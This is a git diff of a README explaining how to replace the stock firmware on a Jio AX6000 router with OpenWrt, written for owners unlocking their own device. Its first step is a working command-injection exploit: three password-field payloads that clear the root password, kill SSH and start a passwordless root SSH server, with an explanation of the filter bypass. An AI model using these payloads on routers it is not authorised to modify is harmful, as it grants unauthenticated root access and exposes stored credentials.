@@ -33,15 +33,19 @@
 ## Table of Contents
 
 - [About](#about)
-- [Firmware: Factory Image & Sysupgrade Variants](#firmware-factory-image--sysupgrade-variants)
-- [Installing Extra Packages (apk)](#installing-extra-packages-apk)
 - [What You Get](#what-you-get)
+- [Firmware Downloads](#firmware-downloads)
 - [Prerequisites](#prerequisites)
-- [Step 1: Enable SSH on Stock Firmware](#step-1-enable-ssh-on-stock-firmware)
-- [Step 1.4: ⚠️ Recommended: Backup MFG Partition & Retrieve U-Boot Creds](#14-️-recommended-backup-mfg-partition--retrieve-u-boot-creds)
-- [Method 1: One-Click Flasher (Beginners)](#method-1-one-click-flasher-beginners)
-- [Method 2: Manual Flash (Advanced Users)](#method-2-manual-flash-advanced-users)
+- [Flashing Guide](#flashing-guide)
+  - [Step 1: Enable SSH on Stock Firmware](#step-1-enable-ssh-on-stock-firmware)
+  - [Step 1.4: Backup MFG Partition & Retrieve U-Boot Creds](#step-14-backup-mfg-partition--retrieve-u-boot-creds)
+  - [Method 1: One-Click Flasher (Beginners)](#method-1-one-click-flasher-beginners)
+  - [Method 2: Manual Flash (Advanced Users)](#method-2-manual-flash-advanced-users)
 - [Post-Install](#post-install)
+  - [Set a Root Password](#set-a-root-password)
+  - [CPU Frequency Profiles](#cpu-frequency-profiles)
+  - [Installing Extra Packages (apk)](#installing-extra-packages-apk)
+  - [Disk Space Breakdown](#disk-space-breakdown)
 - [How It Works](#how-it-works)
 - [FAQ](#faq)
 - [Troubleshooting](#troubleshooting)
@@ -68,22 +72,36 @@ This gives us full root SSH access to the stock router, which we then use to fla
 
 ---
 
-## Firmware: Factory Image & Sysupgrade Variants
+## What You Get
 
-We provide firmware in the [**Releases**](../../releases) tab. You need **two files**:
+After a successful install:
 
-1. **Factory Image** (same for everyone — boots a temporary OpenWrt from RAM):
+| Feature | Details |
+| :--- | :--- |
+| **OS** | OpenWrt (with LuCI WebUI) |
+| **Usable Storage** | ~174 MB (for packages, configs, etc.) |
+| **IP Address** | `192.168.1.1` |
+| **WebUI** | `http://192.168.1.1` (LuCI) |
+| **SSH** | `ssh root@192.168.1.1` |
 
-   `openwrt-qualcommbe-ipq95xx-jiorouter_ax6000-jidu6j11-initramfs-factory.ubi`
+---
 
-2. **Sysupgrade Image** — choose ONE variant based on your needs:
+## Firmware Downloads
+
+All firmware files are available in the [**Releases**](../../releases) tab. You need **two files** to flash:
+
+**1. Factory Image** (same for everyone — boots a temporary OpenWrt from RAM):
+
+`openwrt-qualcommbe-ipq95xx-jiorouter_ax6000-jidu6j11-initramfs-factory.ubi`
+
+**2. Sysupgrade Image** — choose **one** variant based on your needs:
 
 | Variant | Sysupgrade Image (Permanent Flash) |
 | :--- | :--- |
 | **Standard (Recommended)** | `openwrt-qualcommbe-ipq95xx-jiorouter_ax6000-jidu6j11-squashfs-sysupgrade.bin` |
 | **Small Buffers** | `openwrt-qualcommbe-ipq95xx-jiorouter_ax6000-jidu6j11-smallbuffers-squashfs-sysupgrade.bin` |
 
-### 🔍 What is the difference?
+### 🔍 Standard vs Small Buffers
 
 * **Standard Build (Recommended for most users):**
   * Allocates larger networking ring buffers and socket packet buffers (skbuffs) in RAM.
@@ -96,48 +114,6 @@ We provide firmware in the [**Releases**](../../releases) tab. You need **two fi
   * **Trade-off:** Under extreme 1 Gbps+ saturating traffic with high parallel connections, buffer depletion is theoretically possible compared to standard buffers.
 
 > 💡 **Recommendation:** Unless you have a specific need to maximize free RAM for heavy applications, pick the **Standard** build.
-
----
-
-## Installing Extra Packages (apk)
-
-Recent OpenWrt development snapshots (25.x) use **`apk`** (Alpine Package Keeper) as the package manager instead of legacy `opkg`.
-
-Because this release runs a customized Qualcomm kernel (`6.18.60`), kernel modules (`kmod-*`) require an exact kernel hash match (*vermagic*). Installing kernel-dependent packages from upstream snapshot mirrors (`downloads.openwrt.org`) will fail with dependency mismatch errors.
-
-To install extra packages, use the offline package archive **`packages-ipq95xx-6.18.60.zip`** provided in the [Releases](../../releases) section:
-
-1. **Download and Extract:**
-   Download `packages-ipq95xx-6.18.60.zip` and extract the `.apk` packages on your PC.
-
-2. **Upload Package to Router:**
-   ```bash
-   scp -O <package-name>.apk root@192.168.1.1:/tmp/
-   ```
-
-3. **Install Package:**
-   ```bash
-   ssh root@192.168.1.1 "apk add --allow-untrusted /tmp/<package-name>.apk"
-   ```
-
-> [!TIP]
-> Architecture-independent packages (such as LuCI web interface modules, Python scripts, themes, and CLI utilities) that do not depend on `kmod-*` can also be installed directly over an active internet connection:
-> ```bash
-> apk update
-> apk add <package-name>
-> ```
-
-## What You Get
-
-After a successful install:
-
-| Feature | Details |
-| :--- | :--- |
-| **OS** | OpenWrt (with LuCI WebUI) |
-| **Usable Storage** | ~174 MB (for packages, configs, etc.) |
-| **IP Address** | `192.168.1.1` |
-| **WebUI** | `http://192.168.1.1` (LuCI) |
-| **SSH** | `ssh root@192.168.1.1` |
 
 ---
 
@@ -165,13 +141,15 @@ After a successful install:
 
 ---
 
-## Step 1: Enable SSH on Stock Firmware
+## Flashing Guide
+
+### Step 1: Enable SSH on Stock Firmware
 
 > **This step is required for both methods.** You only need to do this once.
 
 The stock Jio router does not have SSH enabled by default. We exploit a command injection vulnerability in the WebUI to enable it.
 
-### 1.1 Connect to the Router
+#### 1.1 Connect to the Router
 
 1. Connect your PC to the router with an **Ethernet cable** (LAN port)
 2. Open a browser and go to: **`http://192.168.31.1`**
@@ -183,32 +161,38 @@ The stock Jio router does not have SSH enabled by default. We exploit a command 
      Example: ![Stock WebUI Login](docs/images/webui-login.png)
 -->
 
-### 1.2 Inject Commands via Password Change
+#### 1.2 Inject Commands via Password Change
 
 Navigate to the **password change** section in the WebUI settings.
 
-Enter the following **three strings in sequence** in the password field, submitting each one:
+Enter and submit the following **three commands in exact sequence** into the password field (click submit after each one):
 
 ---
 
-**Password 1** — Removes the root password:
-```
+#### 1️⃣ Password 1 — Clear Root Password
+Removes any root password lock from the stock firmware:
+```text
 Aa1$(passwd${IFS}-d${IFS}root)
 ```
 
-**Password 2** — Kills the existing SSH daemon:
-```
+#### 2️⃣ Password 2 — Terminate Locked SSH Daemon
+Kills the stock, restricted `dropbear` SSH server:
+```text
 Cc2$(killall${IFS}dropbear)
 ```
 
-**Password 3** — Restarts SSH with no-authentication login:
-```
+#### 3️⃣ Password 3 — Launch Passwordless SSH Daemon
+Spawns an unlocked `dropbear` instance with passwordless root login enabled (`-B` flag):
+```text
 Dd3$(dropbear${IFS}-B)
 ```
 
 ---
 
-> **How do these work?** The `Aa1` / `Cc2` / `Dd3` prefixes satisfy the WebUI's password complexity rules. The `$(...)` part executes shell commands on the router. `${IFS}` is used instead of spaces because spaces are filtered by the form.
+> 💡 **How does this exploit work?**  
+> * **`Aa1` / `Cc2` / `Dd3` prefixes:** Satisfy Jio's password complexity rules (uppercase, lowercase, number).  
+> * **`$(...)` command substitution:** Executes arbitrary shell commands on the router with full `root` privileges.  
+> * **`${IFS}`:** Linux shell Internal Field Separator used in place of spaces, bypassing the WebUI form's whitespace filter.
 
 <!-- 📸 SCREENSHOT PLACEHOLDER:
      Place a screenshot showing the password change form with one of the commands entered.
@@ -216,7 +200,7 @@ Dd3$(dropbear${IFS}-B)
      Example: ![Password Injection](docs/images/webui-password-injection.png)
 -->
 
-### 1.3 Verify SSH Access
+#### 1.3 Verify SSH Access
 
 Open **Command Prompt** (or PowerShell) on your PC and run:
 
@@ -236,9 +220,9 @@ Type `exit` to disconnect.
 
 ---
 
-### 1.4 ⚠️ Recommended: Backup MFG Partition & Retrieve U-Boot Creds
+### Step 1.4: Backup MFG Partition & Retrieve U-Boot Creds
 
-The **`mfg` (manufacturing)** partition stores your device's unique factory metadata: **MAC address, serial number, default Wi-Fi keys, and U-Boot / UART login password**.
+> ⚠️ **Recommended.** The **`mfg` (manufacturing)** partition stores your device's unique factory metadata: **MAC address, serial number, default Wi-Fi keys, and U-Boot / UART login password**.
 
 #### 1. Backup `mfg.bin` to your PC:
 
@@ -270,11 +254,11 @@ You can view your device's login credentials using `strings` or PowerShell:
 
 ---
 
-## Method 1: One-Click Flasher (Beginners)
+### Method 1: One-Click Flasher (Beginners)
 
 > **Recommended for first-time users.** The script auto-detects your downloaded firmware files.
 
-### Steps:
+#### Steps:
 
 1. **Make sure SSH is enabled** (complete [Step 1](#step-1-enable-ssh-on-stock-firmware) first).
 2. **Place all files in the same folder** on your PC:
@@ -306,11 +290,11 @@ You can view your device's login credentials using `strings` or PowerShell:
 
 ---
 
-## Method 2: Manual Flash (Advanced Users)
+### Method 2: Manual Flash (Advanced Users)
 
 > For developers or users who want complete visibility into every command.
 
-### 2.1 Upload Factory Image to Stock Router
+#### 2.1 Upload Factory Image to Stock Router
 
 ```bash
 # Clear any old SSH host keys
@@ -320,7 +304,7 @@ ssh-keygen -R 192.168.31.1
 scp -O openwrt-qualcommbe-*-factory.ubi flash.sh root@192.168.31.1:/tmp/
 ```
 
-### 2.2 Flash the Idle Slot
+#### 2.2 Flash the Idle Slot
 
 SSH into the stock router and execute `flash.sh`:
 
@@ -334,7 +318,7 @@ sh /tmp/flash.sh
 
 The script dynamically inspects `/proc/cmdline` and `/proc/mtd` to determine whether your unit is booted on `rootfs` or `rootfs_1`, formats the idle slot, configures U-Boot, and triggers reboot.
 
-### 2.3 Wait for Reboot into Temporary OpenWrt
+#### 2.3 Wait for Reboot into Temporary OpenWrt
 
 Wait **90 seconds**. The router reboots and boots into temporary OpenWrt at **`192.168.1.1`**.
 
@@ -343,7 +327,7 @@ Verify connection:
 ping 192.168.1.1
 ```
 
-### 2.4 Upload and Apply Permanent Sysupgrade
+#### 2.4 Upload and Apply Permanent Sysupgrade
 
 ```bash
 # Reset host key for 192.168.1.1
@@ -356,7 +340,7 @@ scp -O openwrt-qualcommbe-*-sysupgrade.bin root@192.168.1.1:/tmp/sysupgrade.bin
 ssh root@192.168.1.1 "sysupgrade -v -n /tmp/sysupgrade.bin"
 ```
 
-### 2.5 Wait for Final Reboot
+#### 2.5 Wait for Final Reboot
 
 Wait **90 seconds**. Both NAND slots are now permanently merged into OpenWrt. Access LuCI at: **`http://192.168.1.1`**.
 
@@ -365,11 +349,67 @@ Wait **90 seconds**. Both NAND slots are now permanently merged into OpenWrt. Ac
 ## Post-Install
 
 ### Set a Root Password
+
 Open `http://192.168.1.1` in your browser and set an admin password under **System → Administration**, or via SSH:
 ```bash
 ssh root@192.168.1.1
 passwd
 ```
+
+---
+
+### CPU Frequency Profiles
+
+This build ships with two CPU frequency profiles, both of which have been thoroughly tested:
+
+| Profile | Clock Speed | Description |
+| :--- | :--- | :--- |
+| **Default** | 1.8 GHz | Balanced performance and thermals. Active out of the box. |
+| **Performance** | 2.2 GHz | Maximum CPU throughput. Higher heat output. |
+
+To switch to the **Performance** profile:
+
+```bash
+uci set cpufreq.settings.profile='performance'
+uci set cpufreq.performance.min_freq='2208000'
+uci commit cpufreq
+/etc/init.d/cpufreq reload
+```
+
+> [!CAUTION]
+> **The Performance profile (2.2 GHz) is provided as-is. Use it at your own risk.** Running at higher clock speeds increases heat generation and may reduce the long-term lifespan of the SoC. Ensure your router has adequate ventilation.
+
+---
+
+### Installing Extra Packages (apk)
+
+Recent OpenWrt development snapshots (25.x) use **`apk`** (Alpine Package Keeper) as the package manager instead of legacy `opkg`.
+
+Because this release runs a customized Qualcomm kernel (`6.18.60`), kernel modules (`kmod-*`) require an exact kernel hash match (*vermagic*). Installing kernel-dependent packages from upstream snapshot mirrors (`downloads.openwrt.org`) will fail with dependency mismatch errors.
+
+To install extra packages, use the offline package archive **`packages-ipq95xx-6.18.60.zip`** provided in the [Releases](../../releases) section:
+
+1. **Download and Extract:**
+   Download `packages-ipq95xx-6.18.60.zip` and extract the `.apk` packages on your PC.
+
+2. **Upload Package to Router:**
+   ```bash
+   scp -O <package-name>.apk root@192.168.1.1:/tmp/
+   ```
+
+3. **Install Package:**
+   ```bash
+   ssh root@192.168.1.1 "apk add --allow-untrusted /tmp/<package-name>.apk"
+   ```
+
+> [!TIP]
+> Architecture-independent packages (such as LuCI web interface modules, Python scripts, themes, and CLI utilities) that do not depend on `kmod-*` can also be installed directly over an active internet connection:
+> ```bash
+> apk update
+> apk add <package-name>
+> ```
+
+---
 
 ### Disk Space Breakdown
 
